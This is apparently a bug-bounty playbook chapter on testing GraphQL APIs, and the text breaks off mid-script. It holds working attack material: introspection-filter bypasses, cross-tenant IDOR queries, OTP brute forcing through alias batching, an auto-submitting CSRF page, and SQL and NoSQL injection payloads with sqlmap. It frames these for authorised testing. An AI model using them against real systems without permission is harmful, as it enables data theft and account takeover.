# GQL · GraphQL

> One endpoint, one schema, and an authorisation decision that has to be repeated in every resolver. The bugs that
> pay are resolvers that skip it: a field, a `node(id:)` lookup or a mutation that returns or changes another
> tenant's object. Introspection, GraphiQL and verbose errors are the map, not the finding.

| | |
|---|---|
| **Class** | `graphql` |
| **Applies when** | graphql |
| **Pays** | 57 disclosed reports filed under the class (22 more touch it), 19 paid, median $2,500, top $25,000. The best-paid ones read another tenant's object through a global id or an unguarded field, or passed an argument into a query engine. |
| **Weaknesses** | Improper Access Control - Generic, Insecure Direct Object Reference (IDOR), Information Disclosure · CWE-285, CWE-639, CWE-200 |

## Why it pays

A REST API has one check per route. A GraphQL API has one check per resolver, and a schema of a few hundred types
has thousands of resolvers written by different people at different times. The disclosed reports show where the
check is forgotten: the generic `node` lookup that loads any object by global id (#1618347, $25,000; #447930;
#781150), single fields on an otherwise public type (#978143, #770209, #343464 and #342978 at $2,500 each),
mutations that trust the id they are given (#858671, $4,000; #981472, $2,000), and edges that walk from an
object you may see to one you may not (#423388, #276174).

The second source of money is arguments. The type system checks that a value is a `String`; it does not check
what the string does when it reaches SQL, Elasticsearch or a JavaScript filter library (#3782701, $12,000;
#3694007, $7,000; #435066). The third is transport: a mutation that also runs over GET is a CSRF (#1122408,
$3,370).

What does not pay: the schema itself. Introspection reports are closed as informative or as intended behaviour
(#2886723, #1132803, #291531).

## The crux question

**For every type in the schema, which paths through the graph reach it, and does the resolver on each path check
that this caller may see this object and this field?**

## Applicability probe

Settle `graphql` for the asset, and list every endpoint: the items run against each one.

```bash
# 1. Common paths. A hit is {"data":{"__typename":"Query"}} or a GraphQL-shaped error ("errors":[{"message":...)
for p in /graphql /api/graphql /v1/graphql /v2/graphql /api/v1/graphql /graphql/v1 /query /gql /api/gql \
         /graphql/api /api/query /graph /index.php?graphql; do
  printf '%-22s ' "$p"; curl -sS "${HDR[@]}" -m 10 -X POST "$T$p" -H 'Content-Type: application/json' \
    -d '{"query":"{__typename}"}' -w ' [%{http_code}]' | tr -d '\n' | head -c 160; echo; done
# 2. Paths and operation documents named in the bundles
grep -rEho "[\"'\`]/[A-Za-z0-9_/.-]*(graphql|gql)[A-Za-z0-9_/.-]*[\"'\`]" "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head
grep -rEho "(query|mutation|subscription) [A-Za-z0-9_]+ ?[({]" "$E/recon/$H/js/" | sort -u | head -40
# 3. Same document over GET, and the WebSocket transport
curl -sS "${HDR[@]}" --get --data-urlencode 'query={__typename}' "$T/graphql"
grep -rEho "graphql-ws|graphql-transport-ws|subscriptions-transport-ws|wss?://[^\"'\` ]*graphql[^\"'\` ]*" "$E/recon/$H/js/" | sort -u
```

```bash
scripts/sane fact set "$H" graphql=1 --ev "POST /api/graphql {__typename} -> {\"data\":{\"__typename\":\"Query\"}}; also answers GET"
scripts/sane fact set "$H" websocket=1 --ev "graphql-transport-ws client in main bundle, wss://$H/graphql"
# nothing found:
scripts/sane fact set "$H" graphql=0 --ev "13 common paths: no GraphQL-shaped body; no gql documents or /graphql path in bundles"
```

With `graphql` false the chapter closes for the asset; the planner writes the reason. Save the endpoint list to
`$E/evidence/$H/GQL-001/endpoints.txt`.

## Triage order

GQL-001 (introspection: one request gives the map) → GQL-002 (schema recovery when it is off) → GQL-012
(only when an operation allow-list blocks free-form documents) → GQL-004 (global-id lookup) → GQL-003 (field
authorisation) → GQL-005 (nested paths) → GQL-006 (mutations) → GQL-008 (CSRF over GET or form) → GQL-009
(injection in arguments) → GQL-013 (operation-name, alias and fragment tricks) → GQL-011 (subscriptions) →
GQL-007 (alias batching against rate limits) → GQL-010 (IDE, debug, errors).

## Items

### GQL-001 · Introspection returns the full schema to a client that should not have it

| | |
|---|---|
| **Severity** | None standalone; the map for every other item. Low where the schema is meant to be private and names internal or admin operations |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Information Disclosure · CWE-200 |
| **Prior art** | #291531, #1132803, #2886723, #969456 |

- **Where:** every endpoint from the applicability probe, with and without a session. No further gate: one
  request per endpoint settles it.
- **Test:** send the introspection document. If it is refused, the refusal is often a string match on `__schema`
  in a POST body and not a server setting: change the spelling, the method or the transport.
- **How:**
  ```bash
  D="$E/evidence/$H/GQL-001"; mkdir -p "$D"
  Q='{"query":"query I{__schema{queryType{name} mutationType{name} subscriptionType{name} types{kind name possibleTypes{name} enumValues(includeDeprecated:true){name} inputFields{name type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}} fields(includeDeprecated:true){name isDeprecated args{name type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}} type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}'
  curl -sS "${HDR[@]}"    -X POST "$T/graphql" -H 'Content-Type: application/json' -d "$Q" -o "$D/schema-anon.json"
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -d "$Q" -o "$D/schema-A.json"
  jq -r '.data.__schema.types[]|select(.name|startswith("__")|not)|.name as $t|(.fields//[])[]|"\($t).\(.name)"' "$D/schema-A.json" | sort > "$D/fields.txt"
  jq -r '.data.__schema as $s|$s.types[]|select(.name==($s.mutationType.name//""))|.fields[].name' "$D/schema-A.json" > "$D/mutations.txt"
  wc -l "$D/fields.txt" "$D/mutations.txt"
  ```
  When the plain request is refused:
  ```text
  GET   $T/graphql?query={__schema{types{name}}}
  POST  {"query":"{__schema\n{types{name}}}"}      {"query":"{__schema,{types{name}}}"}      {"query":"{ __schema @skip(if:false){types{name}}}"}
  POST  {"query":"{__type(name:\"Query\"){fields{name args{name}}}}"}        (only __schema is blocked)
  POST  Content-Type: application/x-www-form-urlencoded      query=%7B__schema%7Btypes%7Bname%7D%7D%7D
  the same document on every alternate path, and over the WebSocket transport (GQL-011)
  ```
- **Proof:** the saved schema. For a report it needs more: the list of types and mutations that no front end uses
  (admin, internal, staff, debug, impersonate), and the difference between the anonymous and the authenticated
  schema.
- **Not a finding when:** the API is public and its schema is documented (Shopify closed #2886723 as intended
  behaviour). Introspection alone is informative on most programmes. A schema that shows nothing beyond what the
  bundles already contain adds nothing.
- **Escalate:** `fields.txt` and `mutations.txt` feed GQL-003 to GQL-006. Read deprecated fields first, then
  types named Admin, Internal, Staff, Debug. Arguments named `id`, `ids`, `filter`, `where`, `orderBy`, `sort`,
  `search` go to GQL-004 and GQL-009; arguments named `url`, `uri`, `webhook` go to SSR-001.

### GQL-002 · With introspection off, field suggestions and validation errors rebuild the schema

| | |
|---|---|
| **Severity** | None standalone; replaces GQL-001 as the map |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Information Disclosure · CWE-200 |
| **Prior art** | #291531, #1132803 |

- **Where:** endpoints where GQL-001 returned no schema. No further gate: the first request shows whether the
  oracle exists.
- **Test:** the validator answers a misspelt name with the nearest real ones ("Did you mean"). The same oracle
  exists for types, arguments, enum values and input-object fields. Start from the operation documents the
  front end ships, then let `clairvoyance` ask for the rest with a word list built from the same bundles.
- **How:**
  ```bash
  D="$E/evidence/$H/GQL-002"; mkdir -p "$D"
  # 1. is the oracle on?
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -d '{"query":"{ usr { idd } }"}'
  #    -> Cannot query field "usr" on type "Query". Did you mean "user" or "users"?
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' \
    -d '{"query":"mutation{ updateUser(input:{rol:1}){__typename} }"}'
  #    -> Field "rol" is not defined by type "UpdateUserInput". Did you mean "role"?      (hidden input fields: GQL-006)
  # 2. documents and words the front end already ships
  grep -rEhoz "(query|mutation|subscription|fragment)\s+[A-Za-z0-9_]+[^\`\"']{0,1500}" "$E/recon/$H/js/" | tr '\0' '\n' > "$D/documents.txt"
  grep -oE '\b[A-Za-z_][A-Za-z0-9_]{2,}\b' "$D/documents.txt" | sort -u > "$D/words.txt"
  # 3. recover the rest: one request at a time, slow profile (check `clairvoyance -h` for the installed version)
  clairvoyance "$T/graphql" -H "Cookie: <A's cookie from $E/env.sh>" -H "User-Agent: <programme UA>" \
    -w "$D/words.txt" -c 1 -p slow -o "$D/schema.json"
  ```
- **Proof:** none on its own. The recovered `schema.json` is the input for the other items.
- **Not a finding when:** always, as a report: suggestions are informative. When suggestions are masked the
  validator still separates "unknown field" from "missing sub-selection" or "argument required", so a name can
  be confirmed one at a time, at a higher request cost.
- **Escalate:** as GQL-001. Input-object fields that the oracle reveals and the UI never sends (`role`,
  `ownerId`, `verified`) are mass-assignment candidates for GQL-006.

### GQL-003 · A field on a type the caller can reach returns data the caller's role or tenant must not see

| | |
|---|---|
| **Severity** | Medium standalone for one sensitive attribute; High when the field carries personal data, credentials or another tenant's private content |
| **Requires** | two-accounts\|priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Information Disclosure · CWE-200 |
| **Prior art** | #978143, #770209, #343464, #417170, #792927 |

- **Where:** types that A can load for an object belonging to B: `User`, `Team`, `Organization`, `Project`,
  `Order`, and every type a public page already queries. The UI asks for five fields; the type has fifty.
- **Test:** authorisation is applied to the object ("may A load this team?") and not to each field ("may A read
  `team.privateComment`?"). Select every scalar field of the type on B's object as A and compare with what B
  sees.
- **How:**
  ```bash
  D="$E/evidence/$H/GQL-003"; mkdir -p "$D"
  # selection of every scalar and enum field of a type, one level into object fields, skipping fields with required arguments
  python3 - "$E/evidence/$H/GQL-001/schema-A.json" User > "$D/sel-User.txt" <<'PY'
  import json, sys
  S = {t["name"]: t for t in json.load(open(sys.argv[1]))["data"]["__schema"]["types"]}
  def base(t):
      while t.get("ofType"): t = t["ofType"]
      return t
  def sel(name, depth=1):
      out = []
      for f in S[name].get("fields") or []:
          if any(a["type"]["kind"] == "NON_NULL" for a in f["args"]): continue
          b = base(f["type"])
          if b["kind"] in ("SCALAR", "ENUM"): out.append(f["name"])
          elif depth and b["kind"] == "OBJECT": out.append(f["name"] + "{" + (sel(b["name"], depth - 1) or "__typename") + "}")
      return " ".join(out)
  print(sel(sys.argv[2]))
  PY
  BID='<B user id, read with B own session: {me{id}}>'
  BODY=$(jq -n --arg q "query(\$id:ID!){user(id:\$id){$(cat "$D/sel-User.txt")}}" --arg id "$BID" '{query:$q,variables:{id:$id}}')
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -d "$BODY" -o "$D/user-B-as-A.json"
  curl -sS "${HDR[@]}" $B -X POST "$T/graphql" -H 'Content-Type: application/json' -d "$BODY" -o "$D/user-B-as-B.json"
  diff <(jq -S '.data' "$D/user-B-as-A.json") <(jq -S '.data' "$D/user-B-as-B.json")
  jq '.errors[]?.message' "$D/user-B-as-A.json" | sort | uniq -c
  ```
  Fields that are identical in both files and that the UI does not show to A are the candidates. Repeat without
  a session, and with the low-privilege account inside B's tenant.
- **Proof:** A's response containing a private value B set beforehand (a marker in a private note, B's e-mail
  address, a balance), with the UI page or REST response where A does not get it.
- **Not a finding when:** the field resolves to `null` or an authorisation error for A while B gets the value:
  that is the check working. The value is public by design (shown on the public profile, documented in the
  public API). Counts and booleans are informative on most products; they paid on HackerOne only because the
  existence of a private programme was itself confidential (#715192, #877642).
- **Escalate:** the same field through lists, search and `nodes` (GQL-004) and through nested paths (GQL-005).
  A forbidden field that cannot be selected can often still be used as a filter or sort key and read one
  comparison at a time: `users(filter:{email_starts_with:"a"})`, `orderBy: PRIVATE_FIELD` (#645299, #955286,
  #1838329).

### GQL-004 · `node(id:)` or another global-id lookup returns an object from another tenant

| | |
|---|---|
| **Severity** | High standalone when another tenant's private object is returned; Critical when the ids are enumerable and the type holds personal or financial data |
| **Requires** | two-accounts, object-ids |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Insecure Direct Object Reference (IDOR) · CWE-639 |
| **Prior art** | #1618347, #447930, #781150, #2207248 |

- **Where:** the Relay `node(id:)` and `nodes(ids:)` root fields, and every root field that takes an `ID`. The
  types worth trying are the ones the UI never loads by id: billing documents, tokens, audit entries, internal
  notes, integrations.
- **Test:** the generic lookup resolves the type from the id and loads the record, and the per-type permission
  check that the typed root field has is missing. Global ids are transparent: base64 of `Type:123`, or
  `gid://app/Type/123`.
- **How:**
  ```bash
  D="$E/evidence/$H/GQL-004"; mkdir -p "$D"
  echo 'VXNlcjoxMjM0' | base64 -d; echo                       # -> User:1234
  # every type that node() can return
  jq -r '.data.__schema.types[]|select(.name=="Node")|.possibleTypes[].name' "$E/evidence/$H/GQL-001/schema-A.json"
  # B creates one object of the type and reads its id from B's own session; A asks for it
  ID=$(printf 'Invoice:%s' '<number of an invoice that belongs to B>' | base64 -w0)
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -o "$D/invoice-B-as-A.json" -d "$(jq -n --arg id "$ID" \
    '{query:"query($id:ID!){node(id:$id){__typename id ... on Invoice{number total billingEmail downloadUrl}}}",variables:{id:$id}}')"
  jq . "$D/invoice-B-as-A.json"
  # list form, and an id of one type handed to a field that expects another
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -d "$(jq -n --arg id "$ID" \
    '{query:"query($ids:[ID!]!){nodes(ids:$ids){__typename id}}",variables:{ids:[$id]}}')"
  ```
  One object of B per type is the proof. Do not walk the id space: every other id belongs to a real user.
- **Proof:** A's response with the fields of B's object, including a marker B wrote into it.
- **Not a finding when:** `node` returns `null`, "not found" or an authorisation error for B's id. The object is
  public, or A and B share a tenant in which members may see it. The response holds only `__typename` and the id
  you sent: that is an existence oracle, low at best.
- **Escalate:** state how ids are formed (sequential integer inside base64) to show scale without enumerating.
  A mutation that takes the same id goes to GQL-006. A typed id accepted where another type is expected goes to
  GQL-013.

### GQL-005 · A nested path through the graph reaches an object that the direct query or the REST API refuses

| | |
|---|---|
| **Severity** | High standalone when the path returns another tenant's private data; Medium for same-tenant data above the caller's role |
| **Requires** | two-accounts\|priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Access Control - Generic · CWE-285 |
| **Prior art** | #423388, #276174, #885539, #614355, #2381816 |

- **Where:** edges: a field whose type is an object or a connection. The start is something A may read (A's own
  user, a shared project, B's public profile, a public post); the end is something A may not (B's organisation,
  its members, invoices, tokens, private notes).
- **Test:** the root resolver checks the caller; the child resolver loads associated records by foreign key and
  checks nothing. List every field that returns the protected type, then query each from a start A is allowed
  to read.
- **How:**
  ```bash
  D="$E/evidence/$H/GQL-005"; mkdir -p "$D"; S="$E/evidence/$H/GQL-001/schema-A.json"
  # every Parent.field whose type is, or wraps, the protected type
  jq -r --arg T Invoice '.data.__schema.types[]|select(.fields)|.name as $p|.fields[]|select([.type|..|objects|.name?]|index($T))|"\($p).\(.name)"' "$S"
  # baseline: the direct routes are refused for A
  curl -sS "${HDR[@]}" $A -o /dev/null -w '%{http_code} REST\n' "$T/api/invoices/<B invoice id>"
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' \
    -d '{"query":"{invoice(id:\"<B invoice id>\"){number total}}"}'
  # the path: from an object A can read, across the edges found above
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -o "$D/path.json" \
    -d '{"query":"{ user(login:\"<B username>\"){ id organizations(first:5){ nodes{ name members(first:5){ nodes{ email role } } billing{ invoices(first:5){ nodes{ number total } } } } } } }"}'
  jq '.data, [.errors[]?.message]' "$D/path.json"
  ```
  Keep `first:` small and aim only at B. Also try the return type of a mutation that fails: some servers refuse
  the write and still resolve the selection (`updateProject(...){ project { owner { email } } }`).
- **Proof:** two saved responses for the same session: the direct query or REST call refused, the nested path
  returning B's data.
- **Not a finding when:** the child resolves to `null`, an empty list or a per-node "forbidden" error. The data
  is public on that path by design. Only `totalCount` is returned.
- **Escalate:** each edge that leaks is one root cause: report the resolver, not every path through it. Write
  access along the same edge goes to GQL-006; the REST equivalent goes to the BAC chapter.

### GQL-006 · A mutation changes an object the caller does not own, or performs an action above the caller's role

| | |
|---|---|
| **Severity** | High standalone for a cross-tenant write or a role escalation; Medium for a low-impact setting |
| **Requires** | two-accounts\|priv-accounts, state-change |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Access Control - Generic · CWE-285 |
| **Prior art** | #858671, #981472, #984965, #2122671, #776449 |

- **Where:** `mutations.txt` from GQL-001. First the mutations the UI hides from the low role (invite, role
  change, billing, export, API keys, webhooks, impersonation), then every mutation that takes an id, then
  mutations that exist in the schema and in no bundle (#981472: an undocumented mutation).
- **Test:** the UI hides the button; the resolver does not check the role or that the id belongs to the caller's
  tenant. Input objects also accept fields the form never sends.
- **How:**
  ```bash
  D="$E/evidence/$H/GQL-006"; mkdir -p "$D"
  # input fields of one mutation: which ones does the UI never send?
  jq '.data.__schema.types[]|select(.name=="UpdateProjectInput")|[.inputFields[].name]' "$E/evidence/$H/GQL-001/schema-A.json"
  # A writes to an object of B (B created it for this test)
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -o "$D/write-as-A.json" -d "$(jq -n --arg id '<B project id>' \
    '{query:"mutation($id:ID!){updateProject(input:{id:$id,description:\"gql006-marker\"}){project{id description} errors{message}}}",variables:{id:$id}}')"
  # the victim's view decides
  curl -sS "${HDR[@]}" $B -X POST "$T/graphql" -H 'Content-Type: application/json' \
    -d '{"query":"{project(id:\"<B project id>\"){description}}"}' | tee "$D/read-as-B.json"
  # role variant: the low-privilege account calls an admin mutation inside its own tenant
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' \
    -d '{"query":"mutation{createApiToken(input:{name:\"gql006\",scopes:[ADMIN]}){token{id scopes}}}"}'
  ```
  Destructive mutations (`delete*`, `remove*`, `transfer*`) only against an object B created for the purpose.
- **Proof:** the change seen from B's session, next to A's request and response. For a role escalation: A's role
  before and after from `me{role}`, and one admin-only read that now succeeds.
- **Not a finding when:** HTTP 200 with an `errors` or `userErrors` entry and no change in B's view: GraphQL
  reports failures inside a 200. The payload echoes your input and B's view is unchanged. The role is allowed
  to do this according to the product documentation.
- **Escalate:** hidden input fields (`ownerId`, `role`, `verified`) are mass assignment: API-001 and API-002.
  A write that stores markup shown to other users goes to the XSS chapter (#1085546). The same mutation without
  any session goes to the AUT chapter.

### GQL-007 · Aliases or array batching run a rate-limited operation many times in one HTTP request

| | |
|---|---|
| **Severity** | Medium standalone when the limit protects a one-time code, a 2FA step or a login; Low for any other limit |
| **Requires** | account |
| **Excluded by** | rate-limit |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Restriction of Authentication Attempts · CWE-307 |
| **Prior art** | #3287208, #2166697, #481518 |

- **Where:** mutations and queries that verify a secret or are meant to run a limited number of times: login,
  OTP or 2FA verification, password-reset code, e-mail or phone verification, coupon or invite code checks.
- **Test:** the limiter counts HTTP requests. One document can carry the same field many times under different
  aliases, and many servers accept a JSON array of operations. Prove it on account A only, a few attempts past
  the limit; this is not a brute force.
- **How:**
  ```bash
  D="$E/evidence/$H/GQL-007"; mkdir -p "$D"
  # 1. baseline on your own account: how many sequential wrong codes until the limiter answers (429, lockout text)? Say 10.
  # 2. the same operation 15 times in one request
  python3 - > "$D/alias.json" <<'PY'
  import json
  n = 15
  q = "mutation{" + " ".join('a%d:verifyOtp(input:{code:"%06d"}){success message}' % (i, i) for i in range(n)) + "}"
  print(json.dumps({"query": q}))
  PY
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' --data @"$D/alias.json" \
    | tee "$D/alias-response.json" | jq -c '.data|to_entries[]|[.key,.value.success,.value.message]'
  # 3. array batching
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' \
    -d '[{"query":"mutation{verifyOtp(input:{code:\"000001\"}){success}}"},{"query":"mutation{verifyOtp(input:{code:\"000002\"}){success}}"}]'
  ```
  Then one request whose last alias carries the correct code for A: it must succeed after the wrong ones.
- **Proof:** one response in which every alias past the measured limit was evaluated ("invalid code", not "too
  many attempts"), and the final correct alias accepted. State the limit, the number of aliases one request
  takes, and the size of the code space.
- **Not a finding when:** aliases past the limit return the limiter's error (it counts operations). The account
  locks after N failures whatever the transport. The server answers "batching is not supported". The operation
  guards nothing (a search). The policy lists rate limiting as excluded.
- **Escalate:** with `bruteforce-ok` and nothing less, the AUT chapter covers the full OTP or reset-code run
  against your own account. Aliased expensive queries are a denial of service and excluded (`dos`). Operations
  in an array batch may run concurrently: a one-time action submitted twice in one batch is a race, RAC chapter.

### GQL-008 · A mutation is accepted over GET or a form content type, so another site can run it with the victim's cookies

| | |
|---|---|
| **Severity** | High standalone when a sensitive mutation (e-mail change, role grant, token creation) runs cross-site; Medium for other state changes |
| **Requires** | cookie-auth, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #1122408 |

- **Where:** every GraphQL endpoint that authenticates by cookie. Pick a mutation whose effect is visible and
  harmless for the test (profile text), and name the most sensitive one in the report.
- **Test:** a browser sends a cross-site `application/json` POST only after a CORS preflight. GET, form-encoded,
  `text/plain` and multipart requests need no preflight. If the server executes a mutation from any of those,
  and no CSRF token or custom header is required, the remaining barrier is the cookie's `SameSite` attribute.
- **How:**
  ```bash
  M='mutation{updateProfile(input:{bio:"gql008-marker"}){user{bio}}}'
  curl -sS "${HDR[@]}" $A --get --data-urlencode "query=$M" "$T/graphql"                              # a. GET
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" --data-urlencode "query=$M"                             # b. form-encoded
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: text/plain' -d "$(jq -n --arg q "$M" '{query:$q}')"   # c. JSON as text/plain
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" --form-string "operations=$(jq -n --arg q "$M" '{query:$q}')" --form-string 'map={}'   # d. multipart
  # for each variant that executes: repeat without the CSRF header or token the app normally sends, and with a foreign Origin
  curl -sS "${HDR[@]}" $A --get --data-urlencode "query=$M" -H 'Origin: https://sane-probe.example' "$T/graphql"
  curl -sS -D- -o /dev/null "${HDR[@]}" $A "$T/" | grep -i '^set-cookie'                                # SameSite of the session cookie
  ```
  The proof page, served from `$OOB` (another site) and opened in B's logged-in scriptable browser:
  ```html
  <!-- GET: a top-level navigation carries SameSite=Lax cookies -->
  <script>location = 'https://HOST/graphql?query=' + encodeURIComponent('mutation{updateProfile(input:{bio:"gql008-csrf"}){user{bio}}}')</script>
  <!-- form POST: needs SameSite=None -->
  <form action="https://HOST/graphql" method="POST"><input name="query" value='mutation{updateProfile(input:{bio:"gql008-csrf"}){user{bio}}}'></form>
  <script>document.forms[0].submit()</script>
  ```
- **Proof:** B's profile shows `gql008-csrf` after B's browser loaded the page from the other site. Attach the
  page, the session cookie's attributes and the request from the browser's network log.
- **Not a finding when:** the session travels in an `Authorization` header (then `cookie-auth` is false). Only
  `application/json` is accepted. A custom header is required (`X-CSRF-Token`, `Apollo-Require-Preflight`,
  `X-Apollo-Operation-Name`). GET executes queries and refuses mutations. The cookie is `SameSite=Strict`, or
  `Lax` and only the POST variants work. A curl-only result is not proof: the browser decides.
- **Escalate:** the CSR chapter for token-bypass techniques. Queries over GET with cookies are a cross-site read
  only with a CORS fault (COR chapter) and may be cacheable (CCH chapter).

### GQL-009 · A GraphQL argument reaches a SQL, NoSQL or search-engine query without sanitisation

| | |
|---|---|
| **Severity** | Critical standalone when data is read from the store or code runs; High for a confirmed blind injection |
| **Requires** | params |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #3782701, #3694007, #435066, #1000567 |

- **Where:** arguments named `filter`, `where`, `search`, `query`, `orderBy`, `sort`, `order`, `groupBy`;
  arguments of a custom scalar (`JSON`, `JSONObject`, `Any`); string ids; anything that looks like a column
  name or an expression. #3782701 was a `filter` argument evaluated by a JavaScript query library; #3694007 a
  `sort_query` passed to Elasticsearch.
- **Test:** the type system validates shape, not content. Always send the payload in `variables`: a quote inside
  the document breaks GraphQL parsing and tells you nothing about the back end.
- **How:**
  ```bash
  D="$E/evidence/$H/GQL-009"; mkdir -p "$D"
  g() { curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -d "$1" -o "$D/last.json" \
          -w "%{http_code} %{size_download} %{time_total}  "; echo "$1" | head -c 110; echo; }
  # string argument: boolean pair, then a time pair, three runs each
  for p in "x" "x'" "x''" "x' AND '1'='1" "x' AND '1'='2" "x' AND SLEEP(5)-- -" "x'||pg_sleep(5)--"; do
    g "$(jq -cn --arg v "$p" '{query:"query($v:String!){search(term:$v){totalCount}}",variables:{v:$v}}')"; done
  # sort and order arguments: identifiers and expressions
  for p in "created_at" "created_at,(select 1)" "(case when 1=1 then id else name end)" "created_at desc nulls last"; do
    g "$(jq -cn --arg v "$p" '{query:"query($v:String){items(sort:$v){id}}",variables:{v:$v}}')"; done
  # JSON scalars and filter objects: operators of the back end
  g '{"query":"query($f:JSON){users(filter:$f){id}}","variables":{"f":{"email":{"$ne":null}}}}'
  g '{"query":"query($f:JSON){users(filter:$f){id}}","variables":{"f":{"$where":"sleep(3000)||true"}}}'
  # sqlmap on a saved raw request with * at the injection point inside variables
  sqlmap -r "$D/req.txt" --batch --level 2 --risk 1 --technique=BT --delay 1 --threads 1 --banner
  ```
  Read-only probes only: no stacked writes, no `--os-shell`, no dump beyond the banner.
- **Proof:** a boolean pair with different results, or a timing table (three runs per payload) in which the delay
  follows the payload, then the database banner or current user. Stop there.
- **Not a finding when:** the error is the GraphQL parser's ("Syntax Error: Unterminated string"). All payloads
  give the same response (parameterised query). A delay does not repeat or does not scale. Operator objects are
  the documented API (Hasura `_eq`, `_like`): the question there is row permissions, GQL-003, not injection.
- **Escalate:** the SQL and NSQ chapters for extraction. URL-typed arguments go to SSR-001 (#1864188). Regex
  arguments that hang the server are ReDoS (#1000567), excluded on most programmes (`dos`).

### GQL-010 · A GraphQL IDE, debug mode or verbose error output is enabled in production

| | |
|---|---|
| **Severity** | None standalone; Low when an error or trace discloses a credential, SQL with data or an internal endpoint that is then shown to matter |
| **Requires** | — |
| **Excluded by** | version-disclosure |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Information Exposure Through Debug Information · CWE-215 |
| **Prior art** | #996041, #2233480, #1132803 |

- **Where:** IDE paths next to each endpoint, the endpoint itself with `Accept: text/html`, and the `errors` and
  `extensions` members of responses to malformed operations. No further gate: a dozen requests settle it.
- **Test:** look for an in-browser IDE (GraphiQL, Playground, Apollo Sandbox, Altair, Voyager), for tracing and
  debug extensions, and for stack traces or SQL in error messages.
- **How:**
  ```bash
  for p in /graphiql /graphql/console /playground /graphql/playground /altair /voyager /graphql-explorer /api/graphiql \
           /__graphql /graphql/schema.json /graphql/schema.graphql /v1/explorer /subscriptions; do
    curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} %{size_download} $p\n" "$T$p"; done
  curl -sS "${HDR[@]}" -H 'Accept: text/html' "$T/graphql" | grep -ioE 'graphiql|playground|apollo sandbox|altair|voyager' | sort -u
  # error verbosity, tracing, debug switches
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -d '{"query":"{"}'
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' \
    -d '{"query":"query($id:ID!){node(id:$id){id}}","variables":{"id":{"a":1}}}' | jq '.errors[0]'
  curl -sS "${HDR[@]}" $A -X POST "$T/graphql?debug=1" -H 'Content-Type: application/json' -H 'X-Apollo-Tracing: 1' \
    -d '{"query":"{__typename}","extensions":{"tracing":true}}' | jq '.extensions, .errors'
  ```
  Read `errors[].extensions.exception.stacktrace`, `debugMessage`, `trace`, `extensions.tracing`, and any SQL,
  file path or internal host name in a message.
- **Proof:** for a finding, the response that contains the credential, token, query result or internal URL, and a
  second step showing it is usable. For an IDE alone there is nothing to prove.
- **Not a finding when:** the IDE fronts a public API: it is documentation. Traces show only file paths and
  library versions (`version-disclosure`). The IDE is a static page that sends requests with the visitor's own
  session.
- **Escalate:** old GraphiQL and Playground builds had reflected XSS through URL parameters: CVE and XSS
  chapters. Error text is the oracle for GQL-002 and GQL-009. An IDE on an alternate path may point at an
  endpoint with weaker checks: rerun GQL-001 there.

### GQL-011 · Subscriptions over WebSocket are served without the authentication or object check the HTTP endpoint enforces

| | |
|---|---|
| **Severity** | High standalone when another tenant's events are delivered; Medium when queries or mutations run unauthenticated over the socket; Low for introspection only |
| **Requires** | websocket |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Missing Authorization · CWE-862 |
| **Prior art** | #862835, #1023669 |

- **Where:** the subscription endpoint (usually the same path over `wss://`), sub-protocol `graphql-transport-ws`
  (current) or `graphql-ws` (legacy `subscriptions-transport-ws`).
- **Test:** HTTP middleware authenticates POST requests; the WebSocket server is a separate code path that takes
  its credentials from `connection_init` or from nothing. Three checks: does the socket work with no
  credentials; does it accept a subscription for B's object from A; does it run queries, mutations or
  introspection that the HTTP endpoint refuses.
- **How:**
  ```python
  # pip install 'websockets>=12'      run 1: HDRS = {} (no session)      run 2: HDRS = A's cookie
  import json
  from websockets.sync.client import connect
  URL, SUB = "wss://HOST/graphql", "graphql-transport-ws"     # legacy servers: SUB = "graphql-ws"
  HDRS = {}                                                   # {"Cookie": "<A's cookie from $E/env.sh>"}
  DOCS = ['subscription{ messageAdded(roomId:"<B room id>"){ id body author{ email } } }',
